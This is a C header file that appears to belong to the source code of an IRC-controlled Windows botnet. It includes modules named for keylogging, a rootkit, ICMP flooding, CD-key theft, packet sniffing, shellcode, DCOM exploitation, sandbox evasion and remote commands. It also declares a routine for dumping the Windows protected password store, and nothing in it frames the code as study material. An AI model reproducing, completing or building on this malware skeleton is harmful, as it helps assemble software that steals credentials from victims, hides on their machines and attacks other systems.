#ifdef WIN32
#define _WIN32_WINNT	0x0403
#define WIN32_LEAN_AND_MEAN
#pragma optimize("gsy", on)
#pragma comment(linker, "/ALIGN:4096")
#endif
/* Component header files */
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <winable.h>
#include <iostream>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
/* Bot header files */
#include "defines.h"
#include "ehandler.h"
#include "startup.h"
#include "connect.h"
#include "protocol.h"
#include "commands.h"
#include "msn.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "ri0t.h"
#include "irc_send.h"
#include "crc32.h"
#include "netutils.h"
#include "sysinfo.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "download.h"
#include "ftptransfer.h"
#include "icmpflood.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "httpd.h"
#include "crypt.h"
#include "visit.h"
#include "tftpd.h"
#include "cdkeys.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "psniff.h"
#include "net.h"
#include "secure.h"
#include "lsarestrict.h"
#include "autostart.h"
#include "keylogger.h"
#include "session.h"
#include "findfile.h"
#include "fphost.h"
#include "shellcode.h"
#include "rootkit.h"
#include "sandbust.h"
#include "firefox.h"
#include "dcom2.h"

/* Pass store dumping */
DWORD WINAPI pstore (LPVOID param);
#import "pstorec.dll" no_namespace
#include <psapi.h>

#include "usb.h"
#include <shellapi.h>

typedef struct pststrct
{
	SOCKET sock;
	char chan[128];
} pststrct;
